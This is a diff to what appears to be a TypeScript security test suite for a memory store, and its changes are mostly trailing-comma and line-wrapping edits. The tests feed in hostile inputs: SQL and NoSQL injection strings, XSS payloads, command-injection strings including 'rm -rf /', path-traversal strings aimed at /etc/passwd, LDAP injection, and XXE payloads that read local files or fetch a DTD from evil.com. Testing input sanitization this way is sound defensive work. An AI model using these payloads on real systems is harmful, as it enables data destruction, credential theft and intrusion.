@@ -23,7 +23,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const sqlInjectionAttempts = [
@@ -34,14 +34,17 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         "'; UPDATE users SET password='hacked' WHERE 1=1; --",
         "'; INSERT INTO users (email,password) VALUES ('attacker@evil.com','hacked'); --",
         "1'; DELETE FROM memory_items; --",
-        "'; ALTER TABLE memory_items ADD COLUMN hacked TEXT; --"
+        "'; ALTER TABLE memory_items ADD COLUMN hacked TEXT; --",
       ];
 
       for (const injection of sqlInjectionAttempts) {
-        const result = await memoryStore.find({
-          query: injection,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.find(
+          {
+            query: injection,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         // Should not crash or return unexpected data
         expect(result.items).toBeDefined();
@@ -49,7 +52,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
 
         // Search should be safely escaped
         if (result.items.length > 0) {
-          result.items.forEach(item => {
+          result.items.forEach((item) => {
             expect(item.content).not.toContain('DROP TABLE');
             expect(item.content).not.toContain('SELECT password');
             expect(item.content).not.toContain('UNION SELECT');
@@ -62,21 +65,24 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const maliciousScopes = [
         { tenant: "'; DROP TABLE entities; --", org: 'test-org' },
         { tenant: 'test-tenant', org: "1' OR '1'='1" },
-        { tenant: "'; SELECT * FROM users; --", org: "'; UPDATE passwords" }
+        { tenant: "'; SELECT * FROM users; --", org: "'; UPDATE passwords" },
       ];
 
       for (const maliciousScope of maliciousScopes) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: 'Test content',
-          scope: maliciousScope
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: 'Test content',
+            scope: maliciousScope,
+          },
+          userContext
+        );
 
         // Should either reject the malicious scope or handle it safely
         if (!result.success) {
@@ -92,7 +98,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const noSqlInjectionAttempts = [
@@ -100,15 +106,18 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         { $gt: '' },
         { $regex: '.*' },
         { $where: 'this.password.match(/.*/)' },
-        { $or: [{ email: { $ne: null } }, { password: { $ne: null } }] }
+        { $or: [{ email: { $ne: null } }, { password: { $ne: null } }] },
       ];
 
       for (const injection of noSqlInjectionAttempts) {
         // Test in query parameters
-        const findResult = await memoryStore.find({
-          query: JSON.stringify(injection),
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const findResult = await memoryStore.find(
+          {
+            query: JSON.stringify(injection),
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         expect(findResult.items).toBeDefined();
         expect(findResult.items.length).toBeGreaterThanOrEqual(0);
@@ -121,7 +130,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const xssPayloads = [
@@ -138,16 +147,19 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         '<audio src="x" onerror="alert(\'XSS\')">',
         '<details open ontoggle="alert(\'XSS\')">',
         '<marquee onstart="alert(\'XSS\')">',
-        'javascript:alert(\'XSS\')',
-        '<style>@import "javascript:alert(\'XSS\')";</style>'
+        "javascript:alert('XSS')",
+        '<style>@import "javascript:alert(\'XSS\')";</style>',
       ];
 
       for (const payload of xssPayloads) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: payload,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: payload,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         if (result.success) {
           // Content should be sanitized
@@ -167,24 +179,30 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       // Store content with potential XSS
       const xssContent = '<div>Safe content</div><script>alert("XSS")</script>';
 
-      const storeResult = await memoryStore.store({
-        kind: 'entity' as const,
-        content: xssContent,
-        scope: { tenant: 'test-tenant', org: 'test-org' }
-      }, userContext);
+      const storeResult = await memoryStore.store(
+        {
+          kind: 'entity' as const,
+          content: xssContent,
+          scope: { tenant: 'test-tenant', org: 'test-org' },
+        },
+        userContext
+      );
 
       if (storeResult.success) {
         // Search for the content
-        const searchResult = await memoryStore.find({
-          query: 'Safe content',
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const searchResult = await memoryStore.find(
+          {
+            query: 'Safe content',
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         expect(searchResult.items).toHaveLength(1);
         const retrievedContent = searchResult.items[0].content;
@@ -200,7 +218,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const encodedXssPayloads = [
@@ -208,15 +226,18 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', // HTML entities
         '\\x3Cscript\\x3Ealert\\x28\\x22XSS\\x22\\x29\\x3C/script\\x3E', // Hex encoded
         '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;/script&#62;', // Decimal encoded
-        '\\u003cscript\\u003ealert\\u0028\\u0022XSS\\u0022\\u0029\\u003c/script\\u003e' // Unicode encoded
+        '\\u003cscript\\u003ealert\\u0028\\u0022XSS\\u0022\\u0029\\u003c/script\\u003e', // Unicode encoded
       ];
 
       for (const payload of encodedXssPayloads) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: payload,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: payload,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         if (result.success) {
           // Content should be sanitized or remain encoded (not executed)
@@ -232,7 +253,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const commandInjectionPayloads = [
@@ -247,15 +268,18 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         '; ls -la',
         '`python -c "import os; os.system(\'rm -rf /\')"`',
         '&& ping -c 10 127.0.0.1',
-        '; env'
+        '; env',
       ];
 
       for (const payload of commandInjectionPayloads) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: payload,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: payload,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         if (result.success) {
           // Content should be stored safely without command execution
@@ -275,7 +299,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const pathTraversalPayloads = [
@@ -287,15 +311,18 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
         '/var/www/../../etc/passwd',
         'file:///etc/passwd',
-        '....//....//....//boot.ini'
+        '....//....//....//boot.ini',
       ];
 
       for (const payload of pathTraversalPayloads) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: payload,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: payload,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         if (result.success) {
           // Content should be stored safely without path traversal
@@ -312,7 +339,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const ldapInjectionPayloads = [
@@ -324,14 +351,17 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         '*)\\x00',
         '*)(cn=*))\\x00',
         '*)(|(objectClass=*)(&(uid=*',
-        'admin)(&(password=*))'
+        'admin)(&(password=*))',
       ];
 
       for (const payload of ldapInjectionPayloads) {
-        const result = await memoryStore.find({
-          query: payload,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.find(
+          {
+            query: payload,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         // Should not cause LDAP injection or system compromise
         expect(result.items).toBeDefined();
@@ -345,22 +375,25 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const xxePayloads = [
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
         '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><data>&xxe;</data>',
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
-        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>'
+        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>',
       ];
 
       for (const payload of xxePayloads) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: payload,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: payload,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         if (result.success) {
           // Content should be stored safely without XXE execution
@@ -378,25 +411,20 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
-      const invalidContentTypes = [
-        null,
-        undefined,
-        123,
-        {},
-        [],
-        () => {},
-        Symbol('test')
-      ];
+      const invalidContentTypes = [null, undefined, 123, {}, [], () => {}, Symbol('test')];
 
       for (const invalidContent of invalidContentTypes) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: invalidContent as any,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: invalidContent as any,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         expect(result.success).toBe(false);
         expect(result.error).toContain('invalid content');
@@ -407,17 +435,20 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       // Test with extremely long string
       const longContent = 'A'.repeat(1000000); // 1MB
 
-      const result = await memoryStore.store({
-        kind: 'entity' as const,
-        content: longContent,
-        scope: { tenant: 'test-tenant', org: 'test-org' }
-      }, userContext);
+      const result = await memoryStore.store(
+        {
+          kind: 'entity' as const,
+          content: longContent,
+          scope: { tenant: 'test-tenant', org: 'test-org' },
+        },
+        userContext
+      );
 
       // Should either accept with size limit or reject gracefully
       if (result.success) {
@@ -434,7 +465,7 @@ describe('Security Tests - Input Validation and Sanitization', () => {
       const userContext = {
         userId: testUserId,
         tenant: 'test-tenant',
-        org: 'test-org'
+        org: 'test-org',
       };
 
       const maliciousUnicode = [
@@ -443,15 +474,18 @@ describe('Security Tests - Input Validation and Sanitization', () => {
         '\u202e\u202d\u202a\u202b\u202c', // Direction override characters
         '\ufff0\ufff1\ufff2\ufff3\ufff4\ufff5\ufff6\ufff7\ufff8\ufff9', // Special Unicode
         '\ud800\udc00', // Surrogate pair
-        '\uFEFF\u200B\u200C\u200D\u2060\u180E' // Combination of problematic characters
+        '\uFEFF\u200B\u200C\u200D\u2060\u180E', // Combination of problematic characters
       ];
 
       for (const unicode of maliciousUnicode) {
-        const result = await memoryStore.store({
-          kind: 'entity' as const,
-          content: `Test content: ${unicode}`,
-          scope: { tenant: 'test-tenant', org: 'test-org' }
-        }, userContext);
+        const result = await memoryStore.store(
+          {
+            kind: 'entity' as const,
+            content: `Test content: ${unicode}`,
+            scope: { tenant: 'test-tenant', org: 'test-org' },
+          },
+          userContext
+        );
 
         if (result.success) {
           // Content should be stored with malicious characters removed or replaced
